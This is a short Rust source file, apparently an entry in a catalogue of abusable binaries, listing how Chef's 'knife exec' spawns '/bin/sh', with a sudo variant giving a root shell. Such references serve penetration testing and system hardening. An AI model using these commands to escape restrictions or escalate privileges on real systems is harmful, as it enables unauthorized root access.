pub static BIN_NAME: &'static str = "knife";
pub static BIN_DESC: &'static str = "This is capable of running `ruby` code.";
pub static SH_CODE: &'static str = r#"
    
    knife exec -E 'exec "/bin/sh"'
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo knife exec -E 'exec "/bin/sh"'
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
